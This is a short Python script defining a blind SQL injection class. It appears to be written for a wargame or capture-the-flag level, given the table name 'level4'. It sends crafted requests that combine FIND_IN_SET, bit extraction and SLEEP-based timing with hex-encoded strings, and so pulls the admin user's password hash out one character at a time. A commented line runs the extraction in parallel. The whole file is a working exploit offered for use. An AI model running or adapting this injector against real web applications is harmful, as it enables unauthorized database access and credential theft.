import attr
from joblib import Parallel, delayed
import requests
import time


@attr.s
class SqlInjector:
    baseUrl = attr.ib()
    injectionParameter = attr.ib()
    otherParameters = attr.ib()
    cookies = attr.ib()
    
    def use_find_in_set(self, pos):
        params = self.otherParameters.copy()
        bits = '1'

        for bit in range(2, 6):
            sql = f"1 AND IF((SELECT @a := MID(BIN(FIND_IN_SET(MID(pass, {pos}, 1), 0x302c312c322c332c342c352c362c372c382c392c612c622c632c642c652c66)), {bit}, 1) FROM level4 WHERE username = 0x61646d696e) != MID(0x00, 1, 0), @a, SLEEP(5))"
            params[self.injectionParameter] = sql

            start = time.time()
            r = requests.get(self.baseUrl, params, cookies=self.cookies)
            end = time.time()

            if end - start > 5:
                break

            if 'invalid id' in r.text:
                bits += '0'
            else:
                bits += '1'

        return '0123456789abcdef'[int(bits, base=2) - 1]

# Example usage:
#result = ''.join(Parallel(4, backend='threading', verbose=51)(delayed(inject.use_find_in_set, check_pickle=False)(i) for i in range(1, 33)))
